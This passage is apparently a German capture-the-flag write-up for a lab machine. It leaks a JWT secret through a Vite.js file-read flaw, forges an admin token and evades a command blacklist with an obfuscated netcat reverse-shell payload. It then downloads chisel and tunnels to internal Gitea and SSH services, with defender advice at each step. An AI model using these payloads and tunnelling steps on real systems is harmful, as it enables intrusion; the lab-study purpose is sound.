+            <p class="analysis"><strong>Analyse:</strong> Ich korrigiere den `nc`-Payload und stelle sicher, dass er korrekt URL-kodiert wird. Der Payload `n\c 192.168.2.199 4444 -e /bin/s\h` wird mit Python URL-kodiert. Das `\` vor `c` und `h` soll hier wahrscheinlich verhindern, dass `nc` und `sh` direkt vom Filter erkannt werden. `echo` gibt den kodierten Payload aus, und dann wird `curl` damit ausgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der `echo`-Befehl zeigt den kodierten Payload: `n%5Cc%20192.168.2.199%204444%20-e%20/bin/s%5Ch`.  Die `curl`-Anfrage wird gesendet. Es gibt keine direkte Ausgabe von `curl` hier (da kein `-s` verwendet wurde, müsste `curl` seine eigene Statusausgabe zeigen, oder der Befehl wurde im Hintergrund ausgeführt oder die Ausgabe fehlt hier). Entscheidend ist, was auf dem Netcat-Listener passiert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Parallel den Netcat-Listener beobachten. Wenn die Syntax für BusyBox `nc -e` korrekt ist und der Filter umgangen wird, sollte eine Verbindung eingehen.
+<br><strong>Empfehlung (Admin):</strong> Die Hartnäckigkeit, mit der versucht wird, den Filter zu umgehen, unterstreicht erneut die Schwäche der Blacklist-Methode.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2025-30208]
+└─# <span class="command">ADMIN_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjAsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc0ODQ2ODIzMX0.Sb2sfcSGst6f7zSkUN9VCNkIQW7PSJjFZPFw7iJmj18"</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2025-30208]
+└─# <span class="command">CORRECTED_REVERSE_SHELL_PAYLOAD_ENCODED=$(python3 -c "import urllib.parse; payload = \"n\\\c 192.168.2.199 4444 -e /bin/s\\\h\"; print(urllib.parse.quote(payload))")</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2025-30208]
+└─# <span class="command">echo "Encoded Payload: $CORRECTED_REVERSE_SHELL_PAYLOAD_ENCODED"</span></div>
+                    <pre>Encoded Payload: n%5Cc%20192.168.2.199%204444%20-e%20/bin/s%5Ch</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2025-30208]
+└─# <span class="command">curl -g -H "Authorization: Bearer $ADMIN_TOKEN" "http://192.168.2.205:3000/execute?cmd=${CORRECTED_REVERSE_SHELL_PAYLOAD_ENCODED}"</span></div>
+                </div>
+            </div>
+        </section>
+
+        <section id="poc-initial-access">
+            <h2>Proof of Concept: Remote Code Execution als 'runner'</h2>
+            <p class="analysis"><strong>Kurzbeschreibung:</strong> Durch Ausnutzung einer Arbitrary File Read Schwachstelle (CVE-2025-31125) im Vite.js Development Server konnte die `.env`-Datei ausgelesen werden. Diese enthielt das `JWT_SECRET`. Mit diesem Secret wurde ein gültiger Admin-JWT erstellt. Über den `/execute`-API-Endpunkt konnte dann, unter Umgehung eines rudimentären `COMMAND_FILTER` (durch Verwendung von `n\c` anstelle von `nc` und korrekt URL-kodiertem Payload), eine Reverse Shell zum Angreifer-System aufgebaut werden. Dies gewährt interaktiven Zugriff auf das Zielsystem als Benutzer `runner`.</p>
+            <p class="evaluation"><strong>Voraussetzungen:</strong>
+                <ul>
+                    <li>Netzwerkzugriff auf Port 3000 des Zielsystems (192.168.2.205).</li>
+                    <li>Tools auf Angreiferseite: `curl`, `python3` (für URL-Encoding), `nc` (als Listener).</li>
+                    <li>Kenntnis der CVE-2025-31125 oder einer ähnlichen File-Read-Schwachstelle in Vite.js.</li>
+                    <li>Ein Tool zur JWT-Erstellung (z.B. jwt.io, `jwt_tool`).</li>
+                </ul>
+            </p>
+            <p class="analysis"><strong>Schritt-für-Schritt Anleitung (Zusammenfassung der vorherigen Schritte):</strong>
+                <ol>
+                    <li>Auslesen der `.env` Datei via CVE-2025-31125: `curl "http://192.168.2.205:3000/.env?raw??"` um `JWT_SECRET` und `COMMAND_FILTER` zu erhalten.</li>
+                    <li>Erstellen eines Admin-JWTs mit dem geleakten Secret und `role: "admin"`. (Token: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjAsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc0ODQ2ODIzMX0.Sb2sfcSGst6f7zSkUN9VCNkIQW7PSJjFZPFw7iJmj18`)</li>
+                    <li>Starten eines Netcat-Listeners auf der Angreifer-Maschine: `nc -lvnp 4444`.</li>
+                    <li>Vorbereiten des URL-kodierten Reverse-Shell-Payloads: `CORRECTED_REVERSE_SHELL_PAYLOAD_ENCODED=$(python3 -c "import urllib.parse; payload = \"n\\\c 192.168.2.199 4444 -e /bin/s\\\h\"; print(urllib.parse.quote(payload))")` (Ergebnis: `n%5Cc%20192.168.2.199%204444%20-e%20/bin/s%5Ch`)</li>
+                    <li>Senden des Payloads an den Server: `curl -g -H "Authorization: Bearer $ADMIN_TOKEN" "http://192.168.2.205:3000/execute?cmd=${CORRECTED_REVERSE_SHELL_PAYLOAD_ENCODED}"`</li>
+                </ol>
+            </p>
+            <p class="evaluation"><strong>Erwartetes Ergebnis:</strong> Eine eingehende Verbindung auf dem Netcat-Listener der Angreifer-Maschine, die eine interaktive Shell als Benutzer `runner` auf dem Zielsystem bereitstellt.</p>
+            <p class="analysis"><strong>Beweismittel (Netcat Listener Output):</strong></p>
+            <p class="evaluation"><strong>Bewertung:</strong> <span class="password">Fantastisch, der initiale Zugriff war erfolgreich! Mein Netcat-Listener auf Port 4444 meldet eine eingehende Verbindung vom Zielsystem 192.168.2.205.</span> Ich habe jetzt eine interaktive Shell. Der erste Befehl `id` bestätigt, dass ich als Benutzer `runner` (uid=1000, gid=1000) agiere.
+Die weiteren Befehle dienen der initialen Enumeration:
+- `which python3`, `which python`, `which python2`: Keiner dieser Python-Interpreter scheint im Pfad zu sein.
+- `ls /home`: Zeigt ein Verzeichnis `hana`, was auf einen weiteren Benutzer hindeutet.
+- `ls -la /bin/*h`: Listet verschiedene Binaries im `/bin`-Verzeichnis, die auf `h` enden. Viele davon sind Symlinks zu `busybox` (`arch`, `ash`, `fdflush`, `sh`, `touch`, `watch`). Dies ist typisch für embedded Linux-Systeme oder Docker-Container, die BusyBox für grundlegende Utilities verwenden. `ash` und `sh` als Symlinks zu BusyBox sind wichtig, da sie als Shells dienen.</p>
+            <p class="recommendation"><strong>Risikobewertung:</strong> Mittel bis Hoch. Ein Angreifer hat nun interaktiven Zugriff auf das System als unprivilegierter Benutzer. Von hier aus können weitere Angriffe zur Privilegienerweiterung gestartet, sensible Daten im Kontext des Benutzers `runner` ausgelesen oder das System als Sprungbrett für Angriffe auf andere Systeme im Netzwerk missbraucht werden.
+<br><strong>Empfehlungen (POC-spezifisch):</strong>
+    <ul>
+        <li><strong>Admin:</strong> Die Vite.js-Schwachstelle umgehend beheben (patchen). Das `JWT_SECRET` sofort ändern und alle alten Sessions invalidieren. Den `COMMAND_FILTER` entweder stark verbessern (Whitelist) oder die `/execute`-API entfernen/absichern. Den Zugriff auf den Development-Server generell einschränken.</li>
+        <li><strong>Pentester:</strong> Von dieser Shell aus das System weiter enumerieren: SUID/GUID-Binaries, Kernel-Version, laufende Prozesse, Netzwerkverbindungen, Cronjobs, Home-Verzeichnisse (soweit zugreifbar), um Vektoren für Privilege Escalation zu finden.</li>
+    </ul>
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                    <pre>listening on [any] 4444 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.205] 37351</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;"> <span class="command">id</span></div>
+                    <pre><span class="command">uid=1000(runner) gid=1000(runner) groups=1000(runner)</span></pre>
+                    <div class="prompt" style="color: yellow;"> <span class="command">which python3</span></div>
+                    <div class="prompt" style="color: yellow;"> <span class="command">which python</span></div>
+                    <div class="prompt" style="color: yellow;"> <span class="command">which python2</span></div>
+                    <div class="prompt" style="color: yellow;"> <span class="command">ls /home</span></div>
+                    <pre>hana</pre>
+                    <div class="prompt" style="color: yellow;"> <span class="command">ls -la /bin/*h</span></div>
+                    <pre><span class="command">lrwxrwxrwx    1 root     root            12 Apr 21 10:29 /bin/arch -> /bin/busybox
+lrwxrwxrwx    1 root     root            12 Apr 21 10:29 /bin/ash -> /bin/busybox
+lrwxrwxrwx    1 root     root            12 Apr 21 10:29 /bin/fdflush -> /bin/busybox
+lrwxrwxrwx    1 root     root            12 Apr 21 10:29 /bin/sh -> /bin/busybox
+lrwxrwxrwx    1 root     root            12 Apr 21 10:29 /bin/touch -> /bin/busybox
+lrwxrwxrwx    1 root     root            12 Apr 21 10:29 /bin/watch -> /bin/busybox</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Mit dem Befehl `busybox --list` lasse ich mir alle in der BusyBox-Binary enthaltenen Applets (Befehle) anzeigen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Liste ist lang und enthält viele Standard-Unix-Utilities wie `awk`, `nc` (wahrscheinlich die Version, die ich gerade nutze), `wget`, `find`, `grep`, `ash`, `sh`, etc. Dies bestätigt, dass viele der grundlegenden Befehle über BusyBox bereitgestellt werden. Die Verfügbarkeit dieser Tools ist für die weitere Enumeration und mögliche Exploits wichtig.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Liste der verfügbaren BusyBox-Applets gibt mir einen guten Überblick über die Werkzeuge, die mir auf dem System zur Verfügung stehen, ohne dass separate Binaries installiert sein müssen. Ich kann diese Tools für die weitere Enumeration und Ausnutzung verwenden.
+<br><strong>Empfehlung (Admin):</strong> BusyBox ist oft Teil von minimalen Systemen. Es ist wichtig zu wissen, welche Applets in der verwendeten BusyBox-Version enthalten und aktiviert sind, da einige davon (z.B. `nc`, `wget`) für Angreifer nützlich sein können.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;"> <span class="command">busybox --list</span></div>
+                    <pre>[
+[[
+acpid
+add-shell
+addgroup
+adduser
+adjtimex
+arch
+arp
+arping
+ash
+awk
+base64
+basename
+bbconfig
+bc
+beep
+.....
+....
+...
+..
+.</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich suche nach Dateien mit gesetztem SUID-Bit (`-perm -u=s`) im gesamten Dateisystem (`/`). `-type f` beschränkt die Suche auf reguläre Dateien. Fehler (`stderr`) werden nach `/dev/null` umgeleitet, um die Ausgabe sauber zu halten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Zwei SUID-Binaries werden gefunden: `/usr/bin/sudo` (was zu erwarten ist) und `/bin/bbsuid`. `bbsuid` ist besonders interessant, da es sich um eine BusyBox-spezifische SUID-Wrapper-Funktionalität handeln könnte, die möglicherweise für Privilege Escalation missbraucht werden kann, je nachdem, wie sie konfiguriert ist und welche BusyBox-Applets darüber ausgeführt werden dürfen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das `/bin/bbsuid`-Binary muss genauer untersucht werden. Ich sollte prüfen, welche Befehle damit als Root ausgeführt werden können und ob es bekannte Schwachstellen oder Fehlkonfigurationen im Zusammenhang mit `bbsuid` gibt. GTFOBins und andere Quellen könnten hier hilfreich sein.
+<br><strong>Empfehlung (Admin):</strong> SUID-Binaries sollten auf ein absolutes Minimum beschränkt werden. Jedes SUID-Root-Binary ist ein potenzielles Risiko. `bbsuid` sollte, falls nicht zwingend notwendig, entfernt oder seine Berechtigungen stark eingeschränkt werden. Die Konfiguration von `sudo` (`/etc/sudoers`) sollte ebenfalls restriktiv sein.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;"> <span class="command">find / -perm -u=s -type f 2>/dev/null</span></div>
+                    <pre><span class="command">/usr/bin/sudo
+/bin/bbsuid</span></pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p class="analysis"><strong>Analyse:</strong> Ich versuche, eine weitere Reverse Shell mit BusyBox `nc` auf Port `5555` zu starten, diesmal explizit mit `/bin/ash` als auszuführender Shell. Der Befehl `/bin/busybox nc 192.168.2.199 5555 -e /bin/ash` wird in der bestehenden Reverse Shell (Port 4444) eingegeben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Auf meiner Kali-Maschine, wo der Listener für Port 5555 läuft, kommt eine Verbindung an (`<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.205] 45413</span>`). Ich habe jetzt eine zweite Shell, die explizit eine `ash`-Shell ist. Dies dient oft als Test oder um eine stabilere/andere Shell-Umgebung zu bekommen.
+In dieser neuen Shell prüfe ich wieder mit `which python3`, `which nc` (was `/usr/bin/nc` zurückgibt, was ein Symlink zu BusyBox sein könnte oder eine separate Installation) und `which python*`. Das Ergebnis ist konsistent: kein Python im Pfad. </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die neue `ash`-Shell ist einsatzbereit. Jetzt untersuche ich das gefundene SUID-Binary `/bin/bbsuid`.
+<br><strong>Empfehlung (Admin):</strong> Mehrere offene Reverse Shells erhöhen das Risiko. Die zugrundeliegende Schwachstelle (RCE über die Web-API) ist das Hauptproblem.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;"> <span class="command">/bin/busybox nc 192.168.2.199 5555 -e /bin/ash</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 5555</span></div>
+                    <pre>listening on [any] 5555 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.205] 45413</span></pre>
+                    <div class="prompt" style="color: yellow;"> <span class="command">which python3</span></div>
+                    <div class="prompt" style="color: yellow;"> <span class="command">which nc</span></div>
+                    <pre>/usr/bin/nc</pre>
+                    <div class="prompt" style="color: yellow;"> <span class="command">which python*</span></div>
+                    <div class="prompt" style="color: yellow;"> <span class="command">which python3</span></div>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich teste das SUID-Binary `/bin/bbsuid`. Zuerst rufe ich `/bin/bbsuid /bin/ash` auf, um zu sehen, ob ich damit eine Root-Shell bekomme. Dann `/bin/bbsuid /bin/ash -p` (die `-p` Option bei `su` oder `sudo` versucht oft, Privilegien beizubehalten, hier teste ich, ob es einen Effekt bei `ash` via `bbsuid` hat). Schließlich noch `/bin/bbsuid whoami` und `uname -a`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong>
+- `/bin/bbsuid /bin/ash` und `/bin/bbsuid /bin/ash -p` führen beide zu einer Shell, in der `id` immer noch `uid=1000(runner)` anzeigt. <span class="password">Keine direkte Privilegienerweiterung hier.</span> `bbsuid` scheint nicht standardmäßig alle Befehle als Root auszuführen oder benötigt eine spezielle Konfiguration/Syntax.
+- `/bin/bbsuid whoami` wird vermutlich auch `runner` ausgeben (nicht gezeigt, aber konsistent mit `id`).
+- `uname -a` (ausgeführt in der `ash`-Shell, die durch `bbsuid` gestartet wurde, aber immer noch als `runner` läuft) gibt die Kernel-Informationen aus: `Linux devoops.hmv 6.12.23-0-lts #1-Alpine SMP PREEMPT_DYNAMIC 2025-04-16 13:18:51 x86_64 Linux`. Dies ist ein Alpine Linux System mit einem relativ neuen Kernel (fiktives Datum 2025).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> `bbsuid` allein mit `ash` scheint nicht direkt zu Root zu führen. Es könnte sein, dass `bbsuid` nur bestimmten BusyBox-Applets SUID-Rechte gewährt, wenn sie über `bbsuid` aufgerufen werden, oder es gibt eine Konfigurationsdatei, die das steuert. Die Kernel-Version `6.12.23` ist relativ neu, was die Wahrscheinlichkeit von leicht ausnutzbaren Kernel-Exploits reduziert, aber nicht ausschließt.
+<br><strong>Empfehlung (Admin):</strong> Wenn `bbsuid` vorhanden ist, muss dessen Konfiguration und Zweck genau verstanden werden. Wenn es nicht benötigt wird oder unsicher konfiguriert ist, sollte es entfernt oder die SUID-Berechtigung entzogen werden. Alpine Linux ist eine gute Wahl für minimale Systeme, aber auch hier müssen SUID-Binaries sorgfältig verwaltet werden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;"> <span class="command">/bin/bbsuid /bin/ash</span></div>
+                    <div class="prompt" style="color: yellow;"> <span class="command">id</span></div>
+                    <pre><span class="command">uid=1000(runner) gid=1000(runner) groups=1000(runner)</span></pre>
+                    <div class="prompt" style="color: yellow;"> <span class="command">/bin/bbsuid /bin/ash -p</span></div>
+                    <div class="prompt" style="color: yellow;"> <span class="command">id</span></div>
+                    <pre><span class="command">uid=1000(runner) gid=1000(runner) groups=1000(runner)</span></pre>
+                    <div class="prompt" style="color: yellow;"> <span class="command">/bin/bbsuid whoami</span></div>
+                    <div class="prompt" style="color: yellow;"> <span class="command">uname -a</span></div>
+                    <pre><span class="command">Linux devoops.hmv 6.12.23-0-lts #1-Alpine SMP PREEMPT_DYNAMIC 2025-04-16 13:18:51 x86_64 Linux</span></pre>
+                </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> In der Reverse Shell als `runner` lasse ich mir mit `netstat -altpn` die aktiven Netzwerkverbindungen und lauschenden Ports anzeigen.
+- `-a`: Zeige alle Sockets (listening und non-listening).
+- `-l`: Zeige nur lauschende Sockets. (Kombination mit `-a` ist etwas redundant, aber üblich)
+- `-t`: Zeige TCP-Sockets.
+- `-p`: Zeige den Prozessnamen/PID, dem der Socket gehört.
+- `-n`: Zeige numerische Adressen und Portnummern (keine DNS-Auflösung).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe ist sehr interessant:
+- <span class="command">0.0.0.0:3000 LISTEN 2645/node</span>: Der Node.js-Prozess (Vite Dev Server), den wir bisher attackiert haben.
+- <span class="command">127.0.0.1:3002 LISTEN -</span>: Ein Dienst lauscht auf Port 3002, aber nur auf dem Loopback-Interface (localhost). Der Prozess konnte nicht ermittelt werden (wahrscheinlich weil `runner` nicht die Rechte hat, alle Prozessinfos zu sehen).
+- <span class="command">127.0.0.1:22 LISTEN -</span>: Ein SSH-Server lauscht auf Port 22, ebenfalls nur auf Loopback.
+- <span class="command">::1:3001 LISTEN 2651/node</span>: Ein weiterer Node.js-Prozess lauscht auf Port 3001 auf der IPv6-Loopback-Adresse.
+- Mehrere ESTABLISHED-Verbindungen, darunter meine beiden Reverse Shells (zu Port 4444 und 5555) und Verbindungen zum Vite-Server.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Dienst auf `127.0.0.1:3002` und der SSH-Dienst auf `127.0.0.1:22` sind Hauptziele für die weitere Untersuchung. Da sie nur lokal lauschen, brauche ich Port Forwarding (z.B. mit `chisel` oder `ssh -L`), um von meiner Kali-Maschine darauf zugreifen zu können. Port 3001 (Node) könnte auch interessant sein.
+<br><strong>Empfehlung (Admin):</strong> Dienste, die nur lokal benötigt werden, sollten korrekt an Loopback-Interfaces gebunden sein. Dies ist hier der Fall, was gut ist. Jedoch, wenn ein Angreifer bereits lokalen Zugriff hat (wie hier der `runner`), werden diese Dienste zu potenziellen Zielen für Privilege Escalation.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;"> <span class="command">netstat -altpn</span></div>
+                    <pre>Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+<span class="command">tcp        0      0 0.0.0.0:3000            0.0.0.0:*               LISTEN      2645/node</span>           
+<span class="command">tcp        0      0 127.0.0.1:3002          0.0.0.0:*               LISTEN      -</span>                   
+<span class="command">tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      -</span>                   
+tcp        0      0 192.168.2.205:3000      192.168.2.199:40636     ESTABLISHED 2645/node           
+tcp        0      0 192.168.2.205:3000      192.168.2.199:33458     ESTABLISHED 2645/node           
+tcp        0      0 192.168.2.205:3000      192.168.2.199:45752     TIME_WAIT   -                   
+tcp        0      0 192.168.2.205:45413     192.168.2.199:5555      ESTABLISHED 2727/ash            
+tcp        0      0 192.168.2.205:37351     192.168.2.199:4444      ESTABLISHED 2713/sh             
+<span class="command">tcp6       0      0 ::1:3001                :::*                    LISTEN      2651/node</span>           
+tcp6       0      0 ::1:3001                ::1:54098               ESTABLISHED 2651/node           
+tcp6       0      0 ::1:54098               ::1:3001                ESTABLISHED 2645/node           
+tcp6       0      0 ::1:3001                ::1:45990               TIME_WAIT   -</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Um auf die nur lokal lauschenden Dienste (Port 3002 und 22) zugreifen zu können, muss ich `chisel` (ein schnelles TCP/UDP-Tunneling-Tool über HTTP) auf das Zielsystem hochladen.
+1.  Auf meiner Kali-Maschine starte ich einen einfachen Python-HTTP-Server im Verzeichnis, das `chisel` enthält: `python3 -m http.server 8000`.
+2.  In der Reverse Shell auf dem Zielsystem lade ich `chisel` mit `wget 192.168.2.199:8000/chisel` herunter und mache es mit `chmod +x chisel` ausführbar.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der HTTP-Server auf Kali meldet einen erfolgreichen GET-Request für `/chisel` vom Zielsystem (`<span class="password">192.168.2.205 - - [29/May/2025 00:37:36] "GET /chisel HTTP/1.1" 200 -</span>`). `chisel` ist jetzt auf dem Zielsystem und ausführbar. `wget` ist auf dem Zielsystem verfügbar (wahrscheinlich über BusyBox).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Jetzt `chisel` verwenden, um die Ports weiterzuleiten. Ich starte einen `chisel`-Server auf meiner Kali-Maschine und einen `chisel`-Client auf dem Zielsystem.
+<br><strong>Empfehlung (Admin):</strong> Das Hochladen von Tools auf ein kompromittiertes System ist ein typischer Schritt für Angreifer. Egress-Filtering (Ausgehende Verbindungen beschränken) kann das Herunterladen von Tools erschweren. Intrusion Detection Systeme (IDS) könnten das Hochladen bekannter Hacking-Tools erkennen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;"> <span class="command">wget 192.168.2.199:8000/chisel</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;"> <span class="command">chmod +x chisel</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/chisel]
+└─# <span class="command">python3 -m http.server 8000</span></div>
+                    <pre>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+<span class="password">192.168.2.205 - - [29/May/2025 00:37:36] "GET /chisel HTTP/1.1" 200 -</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Auf meiner Kali-Maschine starte ich einen `chisel`-Server im Reverse-Tunneling-Modus (`--reverse`) auf Port `2525`. Der Server gibt seinen Fingerprint aus und lauscht.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der `chisel`-Server ist bereit, Verbindungen vom Client auf dem Zielsystem entgegenzunehmen und Reverse Port Forwards einzurichten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Als Nächstes den `chisel`-Client auf dem Zielsystem starten, um die Verbindung zum Server auf Kali herzustellen und die gewünschten Ports (3002 und 22) weiterzuleiten.
+<br><strong>Empfehlung (Admin):</strong> Netzwerk-Monitoring auf verdächtige ausgehende Verbindungen zu unbekannten Ports (wie hier 2525) kann helfen, Tunneling-Aktivitäten zu erkennen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/chisel]
+└─# <span class="command">./chisel server --reverse -p 2525</span></div>
+                    <pre>2025/05/29 00:38:18 server: Reverse tunnelling enabled
+2025/05/29 00:38:18 server: Fingerprint zFB69En5ySLyo1ZY4EpusxkQnTSqBtWIYtAIOpbTxqU=
+2025/05/29 00:38:18 server: Listening on http://0.0.0.0:2525</pre>
+                </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> In der Reverse Shell auf dem Zielsystem (als `runner`) starte ich zwei `chisel`-Client-Instanzen:
+1.  `./chisel client 192.168.2.199:2525 R:9090:127.0.0.1:3002 &`: Leitet den lokalen Port 3002 des Zielsystems (`127.0.0.1:3002`) auf Port 9090 meiner Kali-Maschine (`192.168.2.199`) weiter. `R:` bedeutet Remote-Forwarding (aus Sicht des Chisel-Servers).
+2.  `./chisel client 192.168.2.199:2525 R:2222:127.0.0.1:22 &`: Leitet den lokalen SSH-Port 22 des Zielsystems (`127.0.0.1:22`) auf Port 2222 meiner Kali-Maschine weiter.
+Das `&` am Ende jedes Befehls startet den Prozess im Hintergrund.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der `chisel`-Server auf Kali bestätigt die erfolgreichen Verbindungen und das Aufsetzen der Proxies:
+- `<span class="password">session#1: tun: proxy#R:9090=>3002: Listening</span>`
+- `<span class="password">session#2: tun: proxy#R:2222=>22: Listening</span>`
+Ich kann jetzt von meiner Kali-Maschine aus auf `localhost:9090` zugreifen, um mit dem Dienst auf Port 3002 des Ziels zu interagieren, und auf `localhost:2222`, um mich mit dem SSH-Dienst des Ziels zu verbinden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Zuerst den Dienst auf `localhost:9090` (ursprünglich Ziel-Port 3002) im Browser oder mit `curl` untersuchen. Dann versuchen, sich per SSH auf `localhost:2222` zu verbinden.
+<br><strong>Empfehlung (Admin):</strong> Wie zuvor, ausgehenden Traffic überwachen. Application Whitelisting könnte das Ausführen von nicht genehmigten Tools wie `chisel` verhindern.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;"> <span class="command">./chisel client 192.168.2.199:2525 R:9090:127.0.0.1:3002 &amp;</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;"> <span class="command">./chisel client 192.168.2.199:2525 R:2222:127.0.0.1:22 &amp;</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/chisel]
+└─# <span class="command">./chisel server --reverse -p 2525</span></div>
+                    <pre>2025/05/29 00:38:18 server: Reverse tunnelling enabled
+2025/05/29 00:38:18 server: Fingerprint zFB69En5ySLyo1ZY4EpusxkQnTSqBtWIYtAIOpbTxqU=
+2025/05/29 00:38:18 server: Listening on http://0.0.0.0:2525
+<span class="password">2025/05/29 00:40:53 server: session#1: tun: proxy#R:9090=>3002: Listening</span>
+<span class="password">2025/05/29 00:41:24 server: session#2: tun: proxy#R:2222=>22: Listening</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich versuche, mich von meiner Kali-Maschine aus per SSH mit dem weitergeleiteten Port zu verbinden. Der Befehl `ssh hana@192.168.2.199 -p 22222` verwendet den falschen Port (`22222` statt `2222`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Verbindungsversuch schlägt fehl: `<span class="password">ssh: connect to host 192.168.2.199 port 22222: Connection refused</span>`. Dies ist ein einfacher Tippfehler beim Port.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Befehl mit dem korrekten Port (`2222`) wiederholen. Auf Details achten!
+<br><strong>Empfehlung (Admin):</strong> Keine direkte Relevanz, da der Fehler auf Angreiferseite liegt.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools]
+└─# <span class="command">ssh hana@192.168.2.199 -p 22222</span></div>
+                    <pre><span class="password">ssh: connect to host 192.168.2.199 port 22222: Connection refused</span></pre>
+                </div>
+            </div>
+
+            <hr>
+            <img src="gitea_webapp.jpg" alt="durch portforwarding tut sich eine webapp namens gitea auf">
+            <p class="analysis"><strong>Analyse:</strong> Ich greife auf `http://192.168.2.199:9090` (weitergeleitet von Ziel `127.0.0.1:3002`) von meiner Kali-Maschine zu. Das Bild zeigt eine Webanwendungsoberfläche, die als Gitea identifiziert wird – ein Self-Hosted Git-Dienst.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Gitea ist eine interessante Entdeckung. Git-Repositories können Quellcode, Konfigurationsdateien, sensible Informationen in der Commit-Historie oder sogar SSH-Keys enthalten. Da der Dienst nur lokal auf dem Zielsystem lief, war er nicht direkt von außen erreichbar. Der Benutzer `hana` (den wir aus `/etc/passwd` kennen) könnte Repositories auf dieser Gitea-Instanz haben.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Gitea-Instanz gründlich untersuchen:
+- Gibt es öffentliche Repositories?
+- Kann ich mich mit Standard-Credentials oder als `hana` (Passwort unbekannt) anmelden?
+- Gibt es eine Registrierungsfunktion?
+- Nach bekannten Schwachstellen für die Gitea-Version suchen (Version ist noch unbekannt).
+Der Fokus liegt darauf, an den Inhalt der Repositories zu gelangen, insbesondere wenn sie `hana` gehören.
